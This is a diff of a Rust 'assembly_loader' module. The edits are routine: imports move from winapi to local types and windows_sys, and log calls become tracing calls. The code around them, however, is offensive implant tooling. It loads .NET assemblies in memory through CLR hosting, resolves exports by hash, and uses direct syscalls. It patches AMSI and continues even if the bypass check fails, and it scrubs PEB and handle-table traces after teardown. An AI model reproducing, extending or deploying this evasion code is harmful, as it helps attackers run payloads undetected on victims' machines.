@@ -56,13 +56,13 @@ use std::sync::{Mutex, OnceLock};
 use std::time::{Duration, Instant};
 
 use once_cell::sync::Lazy;
-use winapi::shared::guiddef::{CLSID, REFIID};
-use winapi::shared::minwindef::{DWORD, HMODULE, LPDWORD, LPVOID, ULONG};
-use winapi::shared::ntdef::{HRESULT, LPCWSTR, LPWSTR};
-use winapi::shared::winerror::S_OK;
-use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
-use winapi::um::winbase::WAIT_OBJECT_0;
-use winapi::um::winnt::HANDLE;
+use crate::win_types::{CLSID, REFIID};
+use crate::win_types::{DWORD, HMODULE, LPDWORD, LPVOID, ULONG};
+use crate::win_types::{HRESULT, LPCWSTR, LPWSTR};
+use crate::win_types::S_OK;
+use crate::win_types::SECURITY_ATTRIBUTES;
+use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
+use crate::win_types::HANDLE;
 
 // ── Constants ────────────────────────────────────────────────────────────────
 
@@ -836,7 +836,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     if mscoree.is_null() {
         return Err("failed to load mscoree.dll — .NET Framework may not be installed".to_string());
     }
-    log::info!("[assembly_loader] mscoree.dll loaded at {:?}", mscoree);
+    tracing::info!("[assembly_loader] mscoree.dll loaded at {:?}", mscoree);
 
     // ── Get CLRCreateInstance export (dynamic PE export resolution) ──────
     let proc = pe_resolve::get_proc_address_by_hash(
@@ -860,7 +860,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
         ));
     }
     let meta_host = &*(meta_host_ptr as *const ICLRMetaHost);
-    log::info!("[assembly_loader] ICLRMetaHost obtained");
+    tracing::info!("[assembly_loader] ICLRMetaHost obtained");
 
     // ── Enumerate installed runtimes → pick latest v4.x ─────────────────
     let iid_enum = GUID {
@@ -872,13 +872,13 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     };
     let mut enum_ptr: LPVOID = std::ptr::null_mut();
     let hr = ((*meta_host.vtable).enumerate_installed_runtimes)(
-        meta_host_ptr,
+        meta_host_ptr as *mut _,
         iid_enum.as_ptr(),
         &mut enum_ptr,
     );
     if hr != S_OK || enum_ptr.is_null() {
         // Release meta_host
-        ((*meta_host.vtable).release)(meta_host_ptr);
+        ((*meta_host.vtable).release)(meta_host_ptr as *mut _);
         return Err(format!(
             "EnumerateInstalledRuntimes failed: hr={:#010X}",
             hr as u32
@@ -892,7 +892,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     loop {
         let mut fetched: ULONG = 0;
         let mut item: LPVOID = std::ptr::null_mut();
-        let hr = ((*enumerator.vtable).next)(enum_ptr, 1, &mut item, &mut fetched);
+        let hr = ((*enumerator.vtable).next)(enum_ptr as *mut _, 1, &mut item, &mut fetched);
         if hr != S_OK || fetched == 0 {
             break;
         }
@@ -903,7 +903,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
         let mut buf_len: DWORD = 128;
         let mut version_buf = vec![0u16; buf_len as usize];
         let hr = ((*runtime_info.vtable).get_version_string)(
-            item,
+            item as *mut _,
             version_buf.as_mut_ptr(),
             &mut buf_len,
             std::ptr::null_mut(),
@@ -912,13 +912,13 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
             // Try again with returned length.
             version_buf = vec![0u16; buf_len as usize];
             let hr2 = ((*runtime_info.vtable).get_version_string)(
-                item,
+                item as *mut _,
                 version_buf.as_mut_ptr(),
                 &mut buf_len,
                 std::ptr::null_mut(),
             );
             if hr2 != S_OK {
-                ((*runtime_info.vtable).release)(item);
+                ((*runtime_info.vtable).release)(item as *mut _);
                 continue;
             }
         }
@@ -930,7 +930,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
                 .filter(|&c| c != 0)
                 .collect::<Vec<u16>>(),
         );
-        log::info!("[assembly_loader] found runtime: {}", version_str.trim());
+        tracing::info!("[assembly_loader] found runtime: {}", version_str.trim());
 
         // Parse version: we want "v4.x.y..." — extract major and build a
         // sortable numeric value.  For simplicity, look for "v4." prefix.
@@ -954,22 +954,22 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
             best_runtime = Some((item as *mut ICLRRuntimeInfo, version_buf.clone()));
         } else {
             // Release this runtime info.
-            ((*runtime_info.vtable).release)(item);
+            ((*runtime_info.vtable).release)(item as *mut _);
         }
     }
 
     // Release enumerator.
-    ((*enumerator.vtable).release)(enum_ptr);
+    ((*enumerator.vtable).release)(enum_ptr as *mut _);
 
     let (runtime_info_ptr, _ver_buf) = match best_runtime {
         Some(r) => r,
         None => {
-            ((*meta_host.vtable).release)(meta_host_ptr);
+            ((*meta_host.vtable).release)(meta_host_ptr as *mut _);
             return Err("no .NET Framework v4.x runtime found".to_string());
         }
     };
     let runtime_info = &*runtime_info_ptr;
-    log::info!(
+    tracing::info!(
         "[assembly_loader] selected runtime version (numeric={})",
         best_version
     );
@@ -986,7 +986,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     // Release the runtime info now that we have the host.
     ((*runtime_info.vtable).release)(runtime_info_ptr as *mut c_void);
     // Release meta_host.
-    ((*meta_host.vtable).release)(meta_host_ptr);
+    ((*meta_host.vtable).release)(meta_host_ptr as *mut _);
 
     if hr != S_OK || runtime_host_ptr.is_null() {
         return Err(format!(
@@ -998,16 +998,16 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     let runtime_host = &*(runtime_host_ptr as *const ICLRRuntimeHost);
 
     // ── Start the CLR ───────────────────────────────────────────────────
-    let hr = ((*runtime_host.vtable).start)(runtime_host_ptr);
+    let hr = ((*runtime_host.vtable).start)(runtime_host_ptr as *mut _);
     if hr != S_OK {
-        ((*runtime_host.vtable).release)(runtime_host_ptr);
+        ((*runtime_host.vtable).release)(runtime_host_ptr as *mut _);
         return Err(format!(
             "ICLRRuntimeHost::Start() failed: hr={:#010X}",
             hr as u32
         ));
     }
 
-    log::info!("[assembly_loader] CLR started successfully");
+    tracing::info!("[assembly_loader] CLR started successfully");
 
     // ── Get ICorRuntimeHost (v2 hosting interface, available on v4 runtime) ──
     //
@@ -1038,7 +1038,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
         };
         let mut enum_ptr2: LPVOID = std::ptr::null_mut();
         let hr3 = ((*meta_host2.vtable).enumerate_installed_runtimes)(
-            meta_host_ptr2,
+            meta_host_ptr2 as *mut _,
             iid_enum2.as_ptr(),
             &mut enum_ptr2,
         );
@@ -1050,7 +1050,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
             loop {
                 let mut fetched: ULONG = 0;
                 let mut item: LPVOID = std::ptr::null_mut();
-                let hr = ((*enumerator2.vtable).next)(enum_ptr2, 1, &mut item, &mut fetched);
+                let hr = ((*enumerator2.vtable).next)(enum_ptr2 as *mut _, 1, &mut item, &mut fetched);
                 if hr != S_OK || fetched == 0 {
                     break;
                 }
@@ -1058,7 +1058,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
                 let mut blen: DWORD = 128;
                 let mut vbuf = vec![0u16; blen as usize];
                 let hr = ((*ri.vtable).get_version_string)(
-                    item,
+                    item as *mut _,
                     vbuf.as_mut_ptr(),
                     &mut blen,
                     std::ptr::null_mut(),
@@ -1066,7 +1066,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
                 if hr != S_OK {
                     vbuf = vec![0u16; blen as usize];
                     let _ = ((*ri.vtable).get_version_string)(
-                        item,
+                        item as *mut _,
                         vbuf.as_mut_ptr(),
                         &mut blen,
                         std::ptr::null_mut(),
@@ -1095,12 +1095,12 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
                         let old_ri = &*(old as *const ICLRRuntimeInfo);
                         ((*old_ri.vtable).release)(old);
                     }
-                    best_rt2 = Some(item);
+                    best_rt2 = Some(item as *mut _);
                 } else {
-                    ((*ri.vtable).release)(item);
+                    ((*ri.vtable).release)(item as *mut _);
                 }
             }
-            ((*enumerator2.vtable).release)(enum_ptr2);
+            ((*enumerator2.vtable).release)(enum_ptr2 as *mut _);
             if let Some(rt2) = best_rt2 {
                 let ri2 = &*(rt2 as *const ICLRRuntimeInfo);
                 let hr = ((*ri2.vtable).get_interface)(
@@ -1110,11 +1110,11 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
                     &mut cor_host_ptr,
                 );
                 if hr == S_OK && !cor_host_ptr.is_null() {
-                    log::info!(
+                    tracing::info!(
                         "[assembly_loader] ICorRuntimeHost obtained — in-memory loading available"
                     );
                 } else {
-                    log::warn!(
+                    tracing::warn!(
                         "[assembly_loader] GetInterface(ICorRuntimeHost) failed: hr={:#010X} — will use file-based fallback",
                         hr as u32
                     );
@@ -1124,7 +1124,7 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
             }
         }
         let mh2 = &*(meta_host_ptr2 as *const ICLRMetaHost);
-        ((*mh2.vtable).release)(meta_host_ptr2);
+        ((*mh2.vtable).release)(meta_host_ptr2 as *mut _);
     }
 
     Ok((
@@ -1154,13 +1154,13 @@ unsafe fn teardown_clr_host(state: &mut ClrHostState) {
         ((*host.vtable).stop)(state.runtime_host as *mut c_void);
         ((*host.vtable).release)(state.runtime_host as *mut c_void);
         state.runtime_host = std::ptr::null_mut();
-        log::info!("[assembly_loader] CLR host stopped and released");
+        tracing::info!("[assembly_loader] CLR host stopped and released");
     }
     if !state.cor_host.is_null() {
         let cor = &*state.cor_host;
         ((*cor.vtable).release)(state.cor_host as *mut c_void);
         state.cor_host = std::ptr::null_mut();
-        log::info!("[assembly_loader] ICorRuntimeHost released");
+        tracing::info!("[assembly_loader] ICorRuntimeHost released");
     }
     if !state.mscoree.is_null() {
         // FreeLibrary would unload, but we don't want to call it explicitly —
@@ -1172,7 +1172,7 @@ unsafe fn teardown_clr_host(state: &mut ClrHostState) {
     // mscorlib.ni.dll, etc.) from the PEB LDR lists.
     crate::memory_hygiene::scrub_peb_traces();
     crate::memory_hygiene::scrub_handle_table();
-    log::info!("[assembly_loader] PEB and handle hygiene applied after CLR teardown");
+    tracing::info!("[assembly_loader] PEB and handle hygiene applied after CLR teardown");
 }
 
 // ── Idle watcher ─────────────────────────────────────────────────────────────
@@ -1185,7 +1185,7 @@ fn check_idle_timeout() {
     };
     if let Some(ref mut state) = *guard {
         if state.initialized && state.last_used.elapsed().as_secs() > IDLE_TIMEOUT_SECS {
-            log::info!(
+            tracing::info!(
                 "[assembly_loader] CLR host idle for >{}s, tearing down",
                 IDLE_TIMEOUT_SECS
             );
@@ -1215,7 +1215,7 @@ fn ensure_idle_watcher() {
             .name("clr-idle-watcher".to_string())
             .spawn(idle_watcher)
             .expect("failed to spawn CLR idle watcher thread");
-        log::info!("[assembly_loader] idle watcher thread started");
+        tracing::info!("[assembly_loader] idle watcher thread started");
     });
 }
 
@@ -1313,7 +1313,7 @@ fn extract_entry_point_type_name(data: &[u8]) -> String {
     match extract_entry_point_type_name_inner(data) {
         Some(name) => name,
         None => {
-            log::warn!(
+            tracing::warn!(
                 "[assembly_loader] failed to parse .NET metadata for entry point, \
                  using fallback type name 'Program'"
             );
@@ -1540,7 +1540,7 @@ fn extract_entry_point_type_name_inner(data: &[u8]) -> Option<String> {
     for i in 0..num_tdefs {
         if let Some(name) = get_typedef_name(i) {
             if name != "<Module>" {
-                log::warn!(
+                tracing::warn!(
                     "[assembly_loader] no common entry point type found, \
                      using first type: '{}'",
                     name
@@ -1597,7 +1597,7 @@ unsafe fn execute_in_memory_internal(
             hr as u32
         ));
     }
-    log::info!("[assembly_loader] in-memory: default AppDomain obtained");
+    tracing::info!("[assembly_loader] in-memory: default AppDomain obtained");
 
     // ── 2. QI AppDomain for IDispatch ───────────────────────────────────
     let appdomain_dispatch = &*(appdomain_ptr as *const IDispatch);
@@ -1655,7 +1655,7 @@ unsafe fn execute_in_memory_internal(
 
     let assembly_obj = assembly_result.data.pdisp_val;
     let assembly_disp = assembly_obj as *mut IDispatch;
-    log::info!("[assembly_loader] in-memory: Assembly loaded from byte array");
+    tracing::info!("[assembly_loader] in-memory: Assembly loaded from byte array");
 
     // ── 5. Get Assembly.EntryPoint → MethodInfo ─────────────────────────
     let ep_name = to_wide("EntryPoint");
@@ -1691,7 +1691,7 @@ unsafe fn execute_in_memory_internal(
 
     let method_info = ep_result.data.pdisp_val;
     let method_disp = method_info as *mut IDispatch;
-    log::info!("[assembly_loader] in-memory: EntryPoint MethodInfo obtained");
+    tracing::info!("[assembly_loader] in-memory: EntryPoint MethodInfo obtained");
 
     // ── 6. Build args array for Invoke ──────────────────────────────────
     // MethodInfo.Invoke_2(object obj, object[] parameters)
@@ -1909,29 +1909,29 @@ unsafe fn execute_in_memory_internal(
         match thread_result.join() {
             Ok(Ok(())) => {}
             Ok(Err(e)) => {
-                log::warn!("[assembly_loader] in-memory invoke failed: {}", e);
+                tracing::warn!("[assembly_loader] in-memory invoke failed: {}", e);
             }
             Err(_) => {
-                log::warn!("[assembly_loader] in-memory execution thread panicked");
+                tracing::warn!("[assembly_loader] in-memory execution thread panicked");
                 needs_reinit = true;
             }
         }
     } else {
         // Timeout — forcefully terminate the thread.
-        log::warn!(
+        tracing::warn!(
             "[assembly_loader] in-memory assembly timed out after {}s — terminating CLR thread",
             timeout_secs
         );
         let term_status = crate::syscall!("NtTerminateThread", exec_raw_handle as u64, 0u64);
         match term_status {
             Ok(s) if s >= 0 => {
-                log::info!("[assembly_loader] CLR exec thread terminated (status 0x{s:08X})");
+                tracing::info!("[assembly_loader] CLR exec thread terminated (status 0x{s:08X})");
             }
             Ok(s) => {
-                log::warn!("[assembly_loader] NtTerminateThread returned failure 0x{s:08X}");
+                tracing::warn!("[assembly_loader] NtTerminateThread returned failure 0x{s:08X}");
             }
             Err(e) => {
-                log::warn!("[assembly_loader] NtTerminateThread syscall failed: {e}");
+                tracing::warn!("[assembly_loader] NtTerminateThread syscall failed: {e}");
             }
         }
         // Drop the JoinHandle without joining — the thread is already dead.
@@ -1977,7 +1977,7 @@ unsafe fn execute_in_memory_internal(
     let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
     ((*unk.vtable).release)(appdomain_ptr);
 
-    log::info!(
+    tracing::info!(
         "[assembly_loader] in-memory: execution complete, {} bytes output",
         output.len()
     );
@@ -2040,7 +2040,7 @@ pub unsafe fn execute(
     // Ensure AMSI is patched before we load any managed code.
     crate::amsi_defense::orchestrate_layers();
     if !crate::amsi_defense::verify_bypass() {
-        log::warn!("[assembly_loader] AMSI bypass verification failed — proceeding anyway");
+        tracing::warn!("[assembly_loader] AMSI bypass verification failed — proceeding anyway");
     }
 
     // ── COM initialization (STA) — dynamically resolved ─────────────────
@@ -2084,7 +2084,7 @@ pub unsafe fn execute(
         let hr = co_init(std::ptr::null_mut(), 0x0); // COINIT_APARTMENTTHREADED
         if hr as u32 != S_OK as u32 && hr as u32 != 0x80010106 {
             // S_FALSE (already initialized) is fine.
-            log::warn!(
+            tracing::warn!(
                 "[assembly_loader] CoInitializeEx returned {:#010X}",
                 hr as u32
             );
@@ -2110,7 +2110,7 @@ pub unsafe fn execute(
             Some(ref mut state) if state.initialized && state.needs_reinit => {
                 // CLR was left in a potentially inconsistent state after a
                 // forced thread termination.  Tear it down and re-create.
-                log::warn!(
+                tracing::warn!(
                     "[assembly_loader] CLR host flagged for reinit — tearing down and re-creating"
                 );
                 unsafe {
@@ -2155,7 +2155,7 @@ pub unsafe fn execute(
     // If in-memory loading fails or is unavailable, fall through to the
     // existing file-based ExecuteInDefaultAppDomain path.
     if !cor_host.is_null() {
-        log::info!("[assembly_loader] attempting in-memory assembly loading (no disk write)");
+        tracing::info!("[assembly_loader] attempting in-memory assembly loading (no disk write)");
         match execute_in_memory_internal(
             cor_host,
             assembly_bytes,
@@ -2163,11 +2163,11 @@ pub unsafe fn execute(
             timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS),
         ) {
             Ok(result) => {
-                log::info!("[assembly_loader] in-memory execution succeeded");
+                tracing::info!("[assembly_loader] in-memory execution succeeded");
                 return Ok(result);
             }
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "[assembly_loader] in-memory loading failed ({}), falling back to file-based path",
                     e
                 );
@@ -2175,7 +2175,7 @@ pub unsafe fn execute(
             }
         }
     } else {
-        log::info!("[assembly_loader] ICorRuntimeHost not available, using file-based path");
+        tracing::info!("[assembly_loader] ICorRuntimeHost not available, using file-based path");
     }
 
     // ── Write assembly to NT-native temp file (fallback path) ────────
@@ -2220,13 +2220,13 @@ pub unsafe fn execute(
         .chain(std::iter::once(0))
         .collect();
 
-    let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
+    let mut obj_name = crate::win_types::UNICODE_STRING {
         Length: ((nt_path_wide.len() - 1) * 2) as u16,
         MaximumLength: (nt_path_wide.len() * 2) as u16,
         Buffer: nt_path_wide.as_mut_ptr(),
     };
-    let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
-        Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
+    let mut obj_attr = crate::win_types::OBJECT_ATTRIBUTES {
+        Length: std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32,
         RootDirectory: std::ptr::null_mut(),
         ObjectName: &mut obj_name,
         Attributes: OBJ_CASE_INSENSITIVE,
@@ -2433,7 +2433,7 @@ pub unsafe fn execute(
         // runtime is now in a potentially inconsistent state.  We flag it
         // for reinitialization so the next execute() call tears it down and
         // rebuilds it from scratch.
-        log::warn!(
+        tracing::warn!(
             "[assembly_loader] assembly timed out after {}s — forcefully terminating CLR thread",
             timeout
         );
@@ -2442,15 +2442,15 @@ pub unsafe fn execute(
         let term_status = crate::syscall!("NtTerminateThread", exec_handle as u64, 0u64);
         match term_status {
             Ok(s) if s >= 0 => {
-                log::info!("[assembly_loader] CLR exec thread terminated (status 0x{s:08X})");
+                tracing::info!("[assembly_loader] CLR exec thread terminated (status 0x{s:08X})");
             }
             Ok(s) => {
-                log::warn!(
+                tracing::warn!(
                     "[assembly_loader] NtTerminateThread returned failure 0x{s:08X} — CLR thread may still be running"
                 );
             }
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "[assembly_loader] NtTerminateThread syscall failed: {e} — CLR thread may still be running"
                 );
             }
@@ -2463,7 +2463,7 @@ pub unsafe fn execute(
         if let Ok(mut guard) = CLR_HOST.lock() {
             if let Some(ref mut state) = *guard {
                 state.needs_reinit = true;
-                log::info!("[assembly_loader] CLR host flagged for reinit due to forced thread termination");
+                tracing::info!("[assembly_loader] CLR host flagged for reinit due to forced thread termination");
             }
         }
 
